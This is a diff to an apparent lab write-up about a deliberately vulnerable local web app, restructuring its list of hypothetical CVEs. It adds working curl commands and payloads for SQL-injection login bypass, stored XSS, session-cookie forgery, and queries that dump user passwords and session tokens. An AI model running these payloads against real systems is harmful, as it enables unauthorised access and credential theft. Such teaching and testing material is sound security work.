@@ -22,21 +22,34 @@ Authors:
 > All of the CVEs listed here are hypothetical!
 > They do not represent real world CVEs.
 
-Here are the vulnerabilities and to exploit them:
 
-### SQL Injection
+List of vulnerabilities discovered:
 
-```bash
-curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR 1=1 --&password="
-curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR TRUE --&password="
-curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=' UNION select 1 from users; --&password="
-```
+> [!NOTE]- SQL Injection Authentication Bypass (aCVE-2024-0001)
+>
+> ```bash
+> curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR 1=1 --&password="
+> curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=a' OR TRUE --&password="
+> curl 'http://0.0.0.0:5000/login' -X POST --data-raw "username=' UNION select 1 from users; --&password="
+> ```
 
-### Stored XSS
+> [!NOTE]- Stored XSS and SQL Injection Vulnerability by Execution of Arbitrary SQL Queries and JavaScript (aCVE-2024-0002).
+>
+> Use these as the message:
+>
+> - `<script>alert(document.domain)</script>`
+> - `<script>alert(window.origin)</script>`
+> - `1', 1), ((SELECT GROUP_CONCAT(id || ',' || username || ':' || password, '<br>') FROM users), 1)--`
+> - `1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1)--`
 
-```bash
-curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users --" --data-raw 'message=<script>alert(window.origin)</script>'
-```
+
+> [!NOTE]- Credential Bypass via SQL Injection on Session Token (aCVE-2024-0003)
+>
+> ```bash
+> curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1 --" 
+> curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1--" --data-raw "message=message=1', 1), ((SELECT GROUP_CONCAT(id || ',' || username || ':' || password, '<br>') FROM users), 1)--"
+> curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1--" --data-raw "message=1', 1), ((SELECT GROUP_CONCAT(user || ':' || token, '<br>') FROM sessions), 1)--"
+> ```
 
 ### CSRF
 
@@ -463,6 +476,7 @@ On the assumption that a user ID exists, forging a session token is performed th
 
 ```bash
 curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT 1 as id, 'random_name' as username FROM users LIMIT 1 --" 
+curl -L 'http://0.0.0.0:5000/home' -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1 --" 
 ```
 
 And we're in.
@@ -513,6 +527,7 @@ The attack is crafted this way
 
 ```bash
 curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT 1 as id, 'doyou' as username FROM users LIMIT 1--" --data-raw 'message=alice watches 228922'
+curl 'http://0.0.0.0:5000/posts' -X POST -H "Cookie: session_token=' UNION SELECT id, username FROM users LIMIT 1--" --data-raw 'message=alice watches 228922'
 ```
 
 And checking the posts
@@ -531,13 +546,6 @@ the output is
 ```
 
 ***This is a serious concern...***
-
----
-
-This will also create a new `session_token` every time.
-
-
-curl 'http://0.0.0.0:5000/home'  -H 'Cookie: session_token=f5c8541ad5f844d551a4fc9f2554b821b437232324d32260e6d260c4603dbf8a' 
 
 
 ## Patching the vulnerabilities
